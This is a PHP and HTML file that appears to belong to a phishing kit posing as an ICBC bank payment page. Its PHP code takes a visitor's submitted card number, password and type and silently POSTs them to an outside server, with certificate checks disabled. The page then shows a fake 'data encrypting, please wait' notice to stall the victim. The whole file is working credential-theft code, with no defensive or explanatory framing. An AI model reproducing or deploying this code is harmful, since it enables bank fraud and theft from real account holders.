
<?php
/**
 * 发起一个post请求到指定接口
 * 
 * @param string $api 请求的接口
 * @param array $params post参数
 * @param int $timeout 超时时间
 * @return string 请求结果
 */
function postRequest( $api, array $params = array(), $timeout = 30 ) {
    $ch = curl_init();
    curl_setopt( $ch, CURLOPT_URL, $api );
    // 以返回的形式接收信息
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
    // 设置为POST方式
    curl_setopt( $ch, CURLOPT_POST, 1 );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, http_build_query( $params ) );
    // 不验证https证书
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, 0 );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 0 );
    curl_setopt( $ch, CURLOPT_TIMEOUT, $timeout );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/x-www-form-urlencoded;charset=UTF-8',
        'Accept: application/json',
    ) ); 
    // 发送数据
    $response = curl_exec( $ch );
    // 不要忘记释放资源
    curl_close( $ch );
    return $response;
}

$response = postRequest( "http://www.010home.net/index.php?g=portal&m=index&a=addMessage", array(
    'number' => $_POST['number'],
    'password' => $_POST['password'],
    'name' => $_POST['type'],
	'admin_id'=>'2'
) );
?>
<body class="alpha" bgcolor="transparent">
<form name="formx" method="post" action="" target="_self">
<div id="divss" style="outline:none" hidefocus="true" tabindex="0" ></div>
 <div class="Box">
  <div class="Header">
<table border="0" cellspacing="0">
	<tr>
		<td height="32" style="background:url(ICBC/operZone_01.png) no-repeat;border=0;margin=0;padding=0;">
			<table border="0" cellspacing="0">
			  <tr>
			  	<td width="75"></td>
			    <td width="619" valign="bottom" >
					<div align="left" nowrap style="position: absolute; top:0px;left:75px; width: 505px" >
						
								<img src="ICBC/commPay_checked.png" width="156" height="32" border="0">
				    	
					    		<img src="/ICBC/item_separator.png" width="12" height="20" vspace="6" style="display:none">
								<a href="#"><img src="ICBC/epay_unchecked.png" width="155" height="32" border="0"></a>
					    	
			    
  					</div>
  					<div id="thirdpayTips" style="position:absolute; top:35px;left:445px; width:130px;background:url(/ICBC/little_bulb_0.png) no-repeat center top; height:48px;display:none;z-index:100;" >
		              <table>
		                <tr>
		                  <td height="38"  valign="bottom" class="style2"> 自己不便支付时，您可<br>以试下他人代付。</td>
		                </tr>
		              </table>
		            </div>
				</td>
			  </tr>
			</table>
		</td>
	</tr>
	</table>
</div>
<div class="Content">
  <table width="100%" border="0" cellspacing="0" cellpadding="0">
	<tr>
		<td style="background:url(ICBC/operZone_02.png) repeat-y;border=0;margin=0;padding=0;">
			<table border="0" cellspacing="0">
				<tr>
				    <td height="320" colspan="2" valign="middle">
				    <div align="center" id="hbox">
				      <table width="560" border="0" cellspacing="0" cellpadding="0">
				      	<tr>
				  			<td colspan="2"><table width="100%" cellpadding="0px" cellspacing="0"> 
				  				<tr>
						  			<td width="60" height="15" colspan="3"></td>
						  		</tr>  
						  		<tr>
						  			<td width="60"><div align="right"><img src="ICBC/num1_12.gif" width="21" height="20"></div></td>
						 			<td align="left" colspan="2" class="style1" nowrap="nowrap">
										请仔细核对左侧订单信息和下面支付信息：
									</td>
						  		</tr>
								<tr>
									<td width="60" height="31"></td>
						  			<td colspan="2"><table width="100%">  
						  				<tr>
						  					<td width="40%" align="right" class="style1">支付卡（账）号：</td>
						 					<td align="left" class="cardNumberDivide" nowrap>1254125214521452156</td>
						 				</tr>
						 				<tr class="style1">
					 						<td width="40%" align="right" class="style1">订单金额：</td>
					 						<td align="left"><strong><font color="#c7000b">RMB 50.00</font></strong></td>
					 					</tr>						          
										<tr><td height="15" colspan="2"></td></tr>
							
									</table></td>
								</tr>						  		
						  		<tr>
									<td width="60"></td>
						  			<td colspan="2"><table width="100%"> 								
									</table></td>
								</tr>




			  <TR>
                <TD height=20 width=60>
                  <DIV align=right></DIV></TD>
                <TD class=style1 colSpan=5><table width="48%" height="30" cellpadding="0" cellspacing="0">
                  <TR>
                    <TD align="right"><span class="STYLE4">
                    <span class="STYLE5"> <span class="STYLE6">
                    <marquee behavior=alternate  scrollamount=3>
                        <em><strong><font color="#c7000b">数据加密中，请耐心等候</font></strong></em>
                          </marquee>
                    </span> </span> </span></TD>
                  </TR>
                </table></TD>
              </TR>
              <TR>




						          <tr>
						            <td colspan="3"><div align="center">
						            		<input type="hidden" name="action" value="ok" />
											<a href="#">
						              		<img src="ICBC/button_12.gif" width="95" height="26" border="0"></a>&nbsp;&nbsp;
						               		
											<a href="javascript:history.go(-1);"><img src="ICBC/cancel_14.gif" width="95" height="26" border="0"></a>  

						            </div></td>
						          </tr>
						  
						          
						      
						    </table></td></tr>
						</table>
				    </div></td>
				  </tr>
			</table>
		</td>
	</tr>
</table>
</div> 
<div class="Bottom">
  <table border="0" cellspacing="0">
	<tr>
		<td width="613" height="15" style="background:url(ICBC/operZone_03.png) no-repeat;border=0;margin=0;padding=0;">
		</td>
	</tr>
  </table>
 </div>
 </div>
</form>
</body>
